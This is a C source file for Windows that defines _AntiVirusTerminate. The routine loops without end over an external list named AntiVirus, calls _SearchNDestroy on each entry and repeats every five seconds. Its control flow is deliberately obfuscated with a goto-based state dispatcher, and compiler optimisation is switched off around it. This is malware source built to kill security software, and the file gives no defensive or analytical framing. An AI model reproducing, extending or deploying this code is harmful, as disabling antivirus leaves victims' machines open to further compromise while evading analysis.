#include "data_globals.h"
#include <windows.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _AntiVirusTerminate(void)
{
    volatile int dummy_state = 1;
    int index = 0;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    index = 0;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    if (AntiVirus[index] != NULL) {
        dummy_state = 3;
        goto dummy_dispatcher;
    } else {
        dummy_state = 5;
        goto dummy_dispatcher;
    }

dummy_state_3:
    _SearchNDestroy((char *)AntiVirus[index]);
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    index++;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_5:
    Sleep(5000);
    dummy_state = 1;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
